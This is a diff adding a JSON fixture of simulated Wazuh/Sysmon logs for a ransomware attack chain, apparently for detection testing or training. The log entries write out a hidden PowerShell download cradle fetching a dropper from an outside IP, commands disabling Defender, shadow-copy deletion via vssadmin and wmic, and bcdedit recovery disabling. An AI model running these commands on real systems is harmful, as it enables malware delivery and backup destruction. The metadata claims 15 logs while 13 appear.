@@ -1,0 +1,930 @@
+{
+  "_metadata": {
+    "name": "Ransomware Attack Chain",
+    "description": "Complete ransomware attack from initial access to encryption",
+    "total_logs": 15,
+    "kill_chain_phases": [
+      "initial-access",
+      "execution",
+      "defense-evasion",
+      "privilege-escalation",
+      "discovery",
+      "impact"
+    ],
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Initial Access - Malicious email attachment",
+      "sequence": 1,
+      "timestamp": "2026-01-29T09:00:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.407577649",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:00:00.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000001}",
+              "processId": "4000",
+              "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+              "commandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jane.smith\\Downloads\\Payment_Receipt.docm\"",
+              "currentDirectory": "C:\\Users\\jane.smith\\Downloads\\",
+              "user": "CORP\\jane.smith",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{RANSOM-000-0000-0000-000000000001}",
+              "parentProcessId": "3500",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\Explorer.EXE"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Execution - Word spawns PowerShell dropper",
+      "sequence": 2,
+      "timestamp": "2026-01-29T09:00:05.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.363684502",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:00:05.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000002}",
+              "processId": "4100",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.220.100.50/dropper.ps1')\"",
+              "currentDirectory": "C:\\Users\\jane.smith\\Downloads\\",
+              "user": "CORP\\jane.smith",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{RANSOM-001-0001-0001-000000000001}",
+              "parentProcessId": "4000",
+              "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+              "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\""
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Execution - Ransomware binary dropped",
+      "sequence": 3,
+      "timestamp": "2026-01-29T09:00:10.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 11: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.460856110",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:00:10.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000002}",
+              "processId": "4100",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "targetFilename": "C:\\Users\\Public\\svchost.exe",
+              "creationUtcTime": "2026-01-29 09:00:10.000",
+              "user": "CORP\\jane.smith"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Defense Evasion - Disable Windows Defender",
+      "sequence": 4,
+      "timestamp": "2026-01-29T09:00:30.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.352798267",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:00:30.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000003}",
+              "processId": "4200",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true\"",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\jane.smith",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{RANSOM-001-0001-0001-000000000002}",
+              "parentProcessId": "4100",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "parentCommandLine": "powershell.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Privilege Escalation - UAC Bypass",
+      "sequence": 5,
+      "timestamp": "2026-01-29T09:01:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.69933549",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:01:00.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "processId": "4300",
+              "image": "C:\\Windows\\System32\\fodhelper.exe",
+              "commandLine": "C:\\Windows\\System32\\fodhelper.exe",
+              "currentDirectory": "C:\\Users\\jane.smith\\",
+              "user": "CORP\\jane.smith",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{RANSOM-001-0001-0001-000000000002}",
+              "parentProcessId": "4100",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "parentCommandLine": "powershell.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Discovery - Enumerate files for encryption",
+      "sequence": 6,
+      "timestamp": "2026-01-29T09:01:30.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.400080598",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:01:30.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000005}",
+              "processId": "4400",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c dir /s /b C:\\Users\\*.docx C:\\Users\\*.xlsx C:\\Users\\*.pdf C:\\Users\\*.jpg",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\jane.smith",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "parentProcessId": "4300",
+              "parentImage": "C:\\Users\\Public\\svchost.exe",
+              "parentCommandLine": "C:\\Users\\Public\\svchost.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Impact - Delete shadow copies (vssadmin)",
+      "sequence": 7,
+      "timestamp": "2026-01-29T09:02:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.148739930",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:02:00.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000006}",
+              "processId": "4500",
+              "image": "C:\\Windows\\System32\\vssadmin.exe",
+              "commandLine": "vssadmin.exe delete shadows /all /quiet",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\jane.smith",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "parentProcessId": "4300",
+              "parentImage": "C:\\Users\\Public\\svchost.exe",
+              "parentCommandLine": "C:\\Users\\Public\\svchost.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Impact - Delete shadow copies (wmic)",
+      "sequence": 8,
+      "timestamp": "2026-01-29T09:02:10.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.840999694",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:02:10.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000007}",
+              "processId": "4600",
+              "image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+              "commandLine": "wmic shadowcopy delete",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\jane.smith",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "parentProcessId": "4300",
+              "parentImage": "C:\\Users\\Public\\svchost.exe",
+              "parentCommandLine": "C:\\Users\\Public\\svchost.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Impact - Disable recovery",
+      "sequence": 9,
+      "timestamp": "2026-01-29T09:02:20.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.527506961",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:02:20.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000008}",
+              "processId": "4700",
+              "image": "C:\\Windows\\System32\\bcdedit.exe",
+              "commandLine": "bcdedit.exe /set {default} recoveryenabled No",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\jane.smith",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "parentProcessId": "4300",
+              "parentImage": "C:\\Users\\Public\\svchost.exe",
+              "parentCommandLine": "C:\\Users\\Public\\svchost.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Impact - File encryption begins",
+      "sequence": 10,
+      "timestamp": "2026-01-29T09:02:30.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 11: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.764261599",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:02:30.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "processId": "4300",
+              "image": "C:\\Users\\Public\\svchost.exe",
+              "targetFilename": "C:\\Users\\jane.smith\\Documents\\Financial_Report.xlsx.locked",
+              "creationUtcTime": "2026-01-29 09:02:30.000",
+              "user": "CORP\\jane.smith"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Impact - More encrypted files",
+      "sequence": 11,
+      "timestamp": "2026-01-29T09:02:35.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 11: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.14323513",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:02:35.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "processId": "4300",
+              "image": "C:\\Users\\Public\\svchost.exe",
+              "targetFilename": "C:\\Users\\jane.smith\\Documents\\Client_Contracts.docx.locked",
+              "creationUtcTime": "2026-01-29 09:02:35.000",
+              "user": "CORP\\jane.smith"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Impact - Ransom note Documents folder",
+      "sequence": 12,
+      "timestamp": "2026-01-29T09:03:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 11: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.169749207",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:03:00.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "processId": "4300",
+              "image": "C:\\Users\\Public\\svchost.exe",
+              "targetFilename": "C:\\Users\\jane.smith\\Documents\\HOW_TO_RECOVER_FILES.txt",
+              "creationUtcTime": "2026-01-29 09:03:00.000",
+              "user": "CORP\\jane.smith"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Impact - Ransom note Desktop",
+      "sequence": 13,
+      "timestamp": "2026-01-29T09:03:05.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 11: Ransomware Attack Chain",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T0000"
+            ],
+            "tactic": [
+              "Unknown"
+            ],
+            "technique": [
+              "Ransomware Attack Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.239231669",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 09:03:05.000",
+              "processGuid": "{RANSOM-001-0001-0001-000000000004}",
+              "processId": "4300",
+              "image": "C:\\Users\\Public\\svchost.exe",
+              "targetFilename": "C:\\Users\\jane.smith\\Desktop\\HOW_TO_RECOVER_FILES.txt",
+              "creationUtcTime": "2026-01-29 09:03:05.000",
+              "user": "CORP\\jane.smith"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
